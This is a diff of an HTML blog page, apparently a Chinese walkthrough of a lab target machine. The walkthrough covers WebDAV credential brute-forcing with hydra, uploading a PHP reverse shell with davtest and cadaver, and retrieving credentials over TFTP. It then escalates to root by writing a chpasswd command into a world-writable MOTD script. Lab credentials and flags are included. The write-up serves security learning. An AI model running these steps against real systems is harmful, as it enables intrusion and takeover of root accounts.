 <p>但是直接访问creds.txt文件，服务器提示没有该文件，最开始还以为这是作者恶作剧。</p>
 <h2 id="get-shell">2.3. get shell</h2>
 <h3 id="方法1-暴力破解">2.3.1. 方法1-(暴力破解)</h3>
@@ -392,14 +257,15 @@
 <p>经尝试这里纯暴力破解是没有用的，因此采用第二种。</p>
 <ol type="1">
 <li><p>首先生成定制的字典，利用cewl工具</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl 10.0.2.24/ -w dic.txt</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl <span class="token number">10.0</span>.2.24/ -w dic.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li><p>利用hydra配合刚刚生成的字典进行爆破</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L dic.txt -P dic.txt 10.0.2.24 http-get /webdav</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -L dic.txt -P dic.txt <span class="token number">10.0</span>.2.24 http-get /webdav<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501194055.png" /></p>
-<p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: yamdoot</span><br><span class="line">password: Swarg</span><br></pre></td></tr></table></figure></p></li>
+<p><pre class="line-numbers language-none"><code class="language-none">username: yamdoot
+password: Swarg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p></li>
 </ol>
 <p>然后直接访问，发现文件为空。但是这里可以利用两个工具，首先介绍davtest。该工具可以测试是否能够远程连接上webdav服务器，测试当前用户的权限，测试哪些文件格式可以被执行，还可以直接上传文件等功能。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">davtest -url http://10.0.2.24/webdav -auth yamdoot:Swarg</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">davtest -url http://10.0.2.24/webdav -auth yamdoot:Swarg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501194448.png" /></p>
 <p>它做了4件事：</p>
 <ol type="1">
@@ -409,7 +275,7 @@
 <li>执行文件</li>
 </ol>
 <p>从中发现可以上传php文件，并且也可以执行php文件。因此可以上传一个反弹shell的php文件，然后执行即可。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">davtestdavtest -url http://10.0.2.24/webdav -auth yamdoot:Swarg -uploadfile php-reverse-shell.php -uploadloc rev.php </span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">davtestdavtest -url http://10.0.2.24/webdav -auth yamdoot:Swarg -uploadfile php-reverse-shell.php -uploadloc rev.php <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>解释：</p>
 <ol type="1">
 <li><p>php-reverse-shell.php是kali自带的，路径：/usr/share/webshells/php/php-reverse-shell.php</p></li>
@@ -423,7 +289,10 @@
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501195201.png" /></p>
 <p>成功get shell！</p>
 <h3 id="方法2-扫描udp端口">2.3.2. 方法2-(扫描UDP端口)</h3>
-<p>tips.txt中告诉我们存在creds.txt，但是直接访问又不存在，因此可以考虑一下扫描UDP端口： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -F 10.0.2.24</span><br><span class="line"></span><br><span class="line"><span class="comment"># -sU: 扫描UDP端口</span></span><br><span class="line"><span class="comment"># -F: 只扫描常用的100个端口</span></span><br></pre></td></tr></table></figure></p>
+<p>tips.txt中告诉我们存在creds.txt，但是直接访问又不存在，因此可以考虑一下扫描UDP端口： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sU -F <span class="token number">10.0</span>.2.24
+
+<span class="token comment"># -sU: 扫描UDP端口</span>
+<span class="token comment"># -F: 只扫描常用的100个端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
 <p>切记，不要全端口扫描，否则一天可能都扫不完。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501195336.png" /></p>
 <p>发现udp开了两个端口：</p>
@@ -431,14 +300,32 @@
 <li>68是dhcp服务</li>
 <li>69是tftp服务</li>
 </ul>
-<p>前者就是动态分IP没有什么利用的价值，而后者是一个简单的文件传输的服务。可以直接使用下面的命令连接： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp 10.0.24</span><br></pre></td></tr></table></figure></p>
-<p>然后根据tips.txt的提示，下载creds.txt文件 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get creds.txt</span><br></pre></td></tr></table></figure></p>
-<p>查看creds.txt，发现是经过base64编码的，解码同样得到了用户名和密码 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># cat creds.txt                  </span></span><br><span class="line">eWFtZG9vdDpTd2FyZw==</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># echo &#x27;eWFtZG9vdDpTd2FyZw==&#x27;|base64 -d</span></span><br><span class="line">yamdoot:Swarg</span><br></pre></td></tr></table></figure></p>
-<p>这里使用另一款工具cadaver。这款工具可以直接连接上去，然后上传文件即可。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># cadaver http://10.0.2.24/webdav</span></span><br><span class="line">Authentication required <span class="keyword">for</span> webdav on server `10.0.2.24<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">Username: yamdoot</span></span><br><span class="line"><span class="string">Password: </span></span><br><span class="line"><span class="string">dav:/webdav/&gt; put php-reverse-shell.php </span></span><br><span class="line"><span class="string">Uploading php-reverse-shell.php to `/webdav/php-reverse-shell.php&#x27;</span>:</span><br><span class="line">Progress: [=============================&gt;] 100.0% of 5490 bytes succeeded.</span><br><span class="line">dav:/webdav/&gt; ls</span><br><span class="line">Listing collection `/webdav/<span class="string">&#x27;: succeeded.</span></span><br><span class="line"><span class="string">Coll:   DavTestDir_Ul5734                      0  May  1 19:44</span></span><br><span class="line"><span class="string">        php-reverse-shell.php               5490  May  1 19:58</span></span><br><span class="line"><span class="string">        rev.php </span></span><br></pre></td></tr></table></figure></p>
+<p>前者就是动态分IP没有什么利用的价值，而后者是一个简单的文件传输的服务。可以直接使用下面的命令连接： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tftp <span class="token number">10.0</span>.24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>然后根据tips.txt的提示，下载creds.txt文件 <pre class="line-numbers language-none"><code class="language-none">get creds.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>查看creds.txt，发现是经过base64编码的，解码同样得到了用户名和密码 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># cat creds.txt                  </span>
+<span class="token assign-left variable">eWFtZG9vdDpTd2FyZw</span><span class="token operator">==</span>
+
+┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># echo 'eWFtZG9vdDpTd2FyZw=='|base64 -d</span>
+yamdoot:Swarg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>这里使用另一款工具cadaver。这款工具可以直接连接上去，然后上传文件即可。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># cadaver http://10.0.2.24/webdav</span>
+Authentication required <span class="token keyword">for</span> webdav on server <span class="token variable"><span class="token variable">`</span><span class="token number">10.0</span>.2.24':
+Username: yamdoot
+Password: 
+dav:/webdav/<span class="token operator">></span> put php-reverse-shell.php 
+Uploading php-reverse-shell.php to <span class="token variable">`</span></span>/webdav/php-reverse-shell.php<span class="token string">':
+Progress: [=============================>] 100.0% of 5490 bytes succeeded.
+dav:/webdav/> ls
+Listing collection `/webdav/'</span><span class="token builtin class-name">:</span> succeeded.
+Coll:   DavTestDir_Ul5734                      <span class="token number">0</span>  May  <span class="token number">1</span> <span class="token number">19</span>:44
+        php-reverse-shell.php               <span class="token number">5490</span>  May  <span class="token number">1</span> <span class="token number">19</span>:58
+        rev.php <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 <p>之后一样的反弹shell即可。</p>
 <h2 id="权限提升">2.4. 权限提升</h2>
 <p>首先从/etc/passwd中发现存在着四个用户：root, narak, inferno, yamdoot</p>
-<p>然后进行其他信息收集。 ### 2.4.1. get inferno权限 使用下面命令查找有可能存在问题的文件： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -user root -perm -ug=x,-o=w -<span class="built_in">exec</span> ls -l <span class="string">&#x27;&#123;&#125;&#x27;</span> \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p>然后进行其他信息收集。 ### 2.4.1. get inferno权限 使用下面命令查找有可能存在问题的文件： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -type f -user root -perm -ug<span class="token operator">=</span>x,-o<span class="token operator">=</span>w -exec <span class="token function">ls</span> -l <span class="token string">'&#123;&#125;'</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p>上述命令解释：</p>
 <ul>
 <li>从根目录开始寻找文件</li>
@@ -447,15 +334,28 @@
 <li>将找到的文件显示出来</li>
 <li>中间报错信息可能是因为权限不够，因此不重要，利用 2&gt;/dev/null 重定向，不显示出来</li>
 </ul>
-<p>其实我想的是先提到某个用户的权限，再提到root，因此最开始查询的文件属主分别是：narak, inferno, yamdoot。但是没有文件，因此查看root的，发现了一个奇怪的文件 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/$ find / -<span class="built_in">type</span> f -user root -perm -ug=x,o=w -<span class="built_in">exec</span> ls -l <span class="string">&#x27;&#123;&#125;&#x27;</span> \; 2&gt;/dev/null</span><br><span class="line">&lt;oot -perm -ug=x,o=w -<span class="built_in">exec</span> ls -l <span class="string">&#x27;&#123;&#125;&#x27;</span> \; 2&gt;/dev/null</span><br><span class="line">-rwxrwxrwx 1 root root 124 Sep 22  2020 /mnt/hell.sh</span><br><span class="line">-rwxrwxrwx 1 root root 299 May 18  2017 /etc/update-motd.d/91-release-upgrade</span><br><span class="line">-rwxrwxrwx 1 root root 1220 Apr  9  2018 /etc/update-motd.d/00-header</span><br><span class="line">-rwxrwxrwx 1 root root 4251 Apr  9  2018 /etc/update-motd.d/50-motd-news</span><br><span class="line">-rwxrwxrwx 1 root root 604 Mar 21  2018 /etc/update-motd.d/80-esm</span><br><span class="line">-rwxrwxrwx 1 root root 3017 Mar 21  2018 /etc/update-motd.d/80-livepatch</span><br><span class="line">-rwxrwxrwx 1 root root 1157 Apr  9  2018 /etc/update-motd.d/10-help-text</span><br></pre></td></tr></table></figure></p>
-<p>/mnt/hell.sh 跟今天靶机的主题很像，因此查看里面的内容 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/$ cat /mnt/hell.sh</span><br><span class="line">cat /mnt/hell.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span><span class="string">&quot;Highway to Hell&quot;</span>;</span><br><span class="line">--[-----&gt;+&lt;]&gt;---.+++++.+.+++++++++++.--.+++[-&gt;+++&lt;]&gt;++.++++++.--[---&gt;+&lt;]&gt;--.-----.++++.</span><br></pre></td></tr></table></figure></p>
+<p>其实我想的是先提到某个用户的权限，再提到root，因此最开始查询的文件属主分别是：narak, inferno, yamdoot。但是没有文件，因此查看root的，发现了一个奇怪的文件 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@ubuntu:/$ <span class="token function">find</span> / -type f -user root -perm -ug<span class="token operator">=</span>x,o<span class="token operator">=</span>w -exec <span class="token function">ls</span> -l <span class="token string">'&#123;&#125;'</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+<span class="token operator">&lt;</span>oot -perm -ug<span class="token operator">=</span>x,o<span class="token operator">=</span>w -exec <span class="token function">ls</span> -l <span class="token string">'&#123;&#125;'</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+-rwxrwxrwx <span class="token number">1</span> root root <span class="token number">124</span> Sep <span class="token number">22</span>  <span class="token number">2020</span> /mnt/hell.sh
+-rwxrwxrwx <span class="token number">1</span> root root <span class="token number">299</span> May <span class="token number">18</span>  <span class="token number">2017</span> /etc/update-motd.d/91-release-upgrade
+-rwxrwxrwx <span class="token number">1</span> root root <span class="token number">1220</span> Apr  <span class="token number">9</span>  <span class="token number">2018</span> /etc/update-motd.d/00-header
+-rwxrwxrwx <span class="token number">1</span> root root <span class="token number">4251</span> Apr  <span class="token number">9</span>  <span class="token number">2018</span> /etc/update-motd.d/50-motd-news
+-rwxrwxrwx <span class="token number">1</span> root root <span class="token number">604</span> Mar <span class="token number">21</span>  <span class="token number">2018</span> /etc/update-motd.d/80-esm
+-rwxrwxrwx <span class="token number">1</span> root root <span class="token number">3017</span> Mar <span class="token number">21</span>  <span class="token number">2018</span> /etc/update-motd.d/80-livepatch
+-rwxrwxrwx <span class="token number">1</span> root root <span class="token number">1157</span> Apr  <span class="token number">9</span>  <span class="token number">2018</span> /etc/update-motd.d/10-help-text<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>/mnt/hell.sh 跟今天靶机的主题很像，因此查看里面的内容 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@ubuntu:/$ <span class="token function">cat</span> /mnt/hell.sh
+<span class="token function">cat</span> /mnt/hell.sh
+<span class="token comment">#!/bin/bash</span>
+
+<span class="token builtin class-name">echo</span><span class="token string">"Highway to Hell"</span><span class="token punctuation">;</span>
+--<span class="token punctuation">[</span>-----<span class="token operator">></span>+<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span>---.+++++.+.+++++++++++.--.+++<span class="token punctuation">[</span>-<span class="token operator">></span>+++<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span>++.++++++.--<span class="token punctuation">[</span>---<span class="token operator">></span>+<span class="token operator">&lt;</span><span class="token punctuation">]</span><span class="token operator">></span>--.-----.++++.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 <p>这其实是brainfuck语言编写的（对没错，这是一门计算机语言），直接在线解密即可。推荐一个网站：<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">Brainfuck/Ook! Obfuscation/Encoding [splitbrain.org]</a></p>
 <p>解密得到的信息为：chitragupt</p>
 <p>接下来切换用户尝试一下，最后成功切换到inferno用户。不过我使用ssh连接，会更稳定</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501201030.png" /></p>
 <h3 id="get-root权限">2.4.2. get root权限</h3>
 <h4 id="方法1-motd提权">2.4.2.1. 方法1-(MOTD提权)</h4>
-<p>经过信息收集，还是没有可以利用的点。但是注意到刚刚执行下面命令时，还有其他可疑的文件。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -user root -perm -ug=x,-o=w -<span class="built_in">exec</span> ls -l <span class="string">&#x27;&#123;&#125;&#x27;</span> \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p>经过信息收集，还是没有可以利用的点。但是注意到刚刚执行下面命令时，还有其他可疑的文件。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -type f -user root -perm -ug<span class="token operator">=</span>x,-o<span class="token operator">=</span>w -exec <span class="token function">ls</span> -l <span class="token string">'&#123;&#125;'</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220501201129.png" /></p>
 <table style="width:7%;">
 <colgroup>
@@ -473,14 +373,99 @@
 </tr>
 </tbody>
 </table>
-<p>可以看到这些文件对所有用户开放了权限。因此可以利用这些文件，朝里面写入修改root用户的密码，然后下次登录时就会执行这些文件，因此修改了root的用户密码，因此我们就能提权到root。下面命令就是将<code>echo 'root:hdfzzf'|chpasswd</code>写入到文件中： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inferno@ubuntu:~$ <span class="built_in">echo</span> <span class="string">&quot;echo &#x27;root:hdfzzf&#x27;|chpasswd&quot;</span> &gt;&gt; /etc/update-motd.d/00-header</span><br></pre></td></tr></table></figure></p>
-<p>重新ssh连接，然后su root即可 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># ssh inferno@10.0.2.24                                                                                        130 ⨯</span></span><br><span class="line">inferno@10.0.2.24<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Canonical Livepatch is available for installation.</span></span><br><span class="line"><span class="string">   - Reduce system reboots and improve kernel security. Activate at:</span></span><br><span class="line"><span class="string">     https://ubuntu.com/livepatch</span></span><br><span class="line"><span class="string">New release &#x27;</span>20.04.4 LTS<span class="string">&#x27; available.</span></span><br><span class="line"><span class="string">Run &#x27;</span>do-release-upgrade<span class="string">&#x27; to upgrade to it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Sun May  1 05:09:56 2022 from 10.0.2.4</span></span><br><span class="line"><span class="string">inferno@ubuntu:~$ su root</span></span><br><span class="line"><span class="string">Password: </span></span><br><span class="line"><span class="string">root@ubuntu:/home/inferno# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br></pre></td></tr></table></figure></p>
-<p>依次读取flag： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// 1. /home/inferno/user.txt</span><br><span class="line">Flag: &#123;5f95bf06ce19af69bfa5e53f797ce6e2&#125;</span><br><span class="line"></span><br><span class="line">// 2. /root/root.txt</span><br><span class="line">██████████████████████████████████████████████████████████████████████████████████████████</span><br><span class="line">█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█</span><br><span class="line">█░░▄▀░░░░░░░░░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█</span><br><span class="line">█░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█</span><br><span class="line">█░░▄▀░░░░░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░████░░▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███</span><br><span class="line">█░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░█</span><br><span class="line">█░░▄▀░░██░░░░░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀░░█</span><br><span class="line">█░░░░░░██████████░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░█</span><br><span class="line">██████████████████████████████████████████████████████████████████████████████████████████</span><br><span class="line">                           </span><br><span class="line">                                                                                    </span><br><span class="line">Root Flag: &#123;9440aee508b6215995219c58c8ba4b45&#125;</span><br><span class="line"></span><br><span class="line">!! Congrats you have finished this task !!</span><br><span class="line"></span><br><span class="line">Contact us here:</span><br><span class="line"></span><br><span class="line">Hacking Articles : https://twitter.com/hackinarticles</span><br><span class="line"></span><br><span class="line">Jeenali Kothari  : https://www.linkedin.com/<span class="keyword">in</span>/jeenali-kothari/</span><br><span class="line"></span><br><span class="line">+-+-+-+-+-+ +-+-+-+-+-+-+-+</span><br><span class="line"> |E|n|j|o|y| |H|A|C|K|I|N|G|</span><br><span class="line"> +-+-+-+-+-+ +-+-+-+-+-+-+-+</span><br><span class="line">__________________________________</span><br></pre></td></tr></table></figure></p>
+<p>可以看到这些文件对所有用户开放了权限。因此可以利用这些文件，朝里面写入修改root用户的密码，然后下次登录时就会执行这些文件，因此修改了root的用户密码，因此我们就能提权到root。下面命令就是将<code>echo 'root:hdfzzf'|chpasswd</code>写入到文件中： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">inferno@ubuntu:~$ <span class="token builtin class-name">echo</span> <span class="token string">"echo 'root:hdfzzf'|chpasswd"</span> <span class="token operator">>></span> /etc/update-motd.d/00-header<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>重新ssh连接，然后su root即可 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># ssh inferno@10.0.2.24                                                                                        130 ⨯</span>
+inferno@10.0.2.24<span class="token string">'s password: 
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+New release '</span><span class="token number">20.04</span>.4 LTS<span class="token string">' available.
+Run '</span>do-release-upgrade' to upgrade to it.
+
+Last login: Sun May  <span class="token number">1</span> 05:09:56 <span class="token number">2022</span> from <span class="token number">10.0</span>.2.4
+inferno@ubuntu:~$ <span class="token function">su</span> root
+Password: 
+root@ubuntu:/home/inferno<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>依次读取flag： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// <span class="token number">1</span>. /home/inferno/user.txt
+Flag: <span class="token punctuation">&#123;</span>5f95bf06ce19af69bfa5e53f797ce6e2<span class="token punctuation">&#125;</span>
+
+// <span class="token number">2</span>. /root/root.txt
+██████████████████████████████████████████████████████████████████████████████████████████
+█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█
+█░░▄▀░░░░░░░░░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█
+█░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█
+█░░▄▀░░░░░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░████░░▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███
+█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███
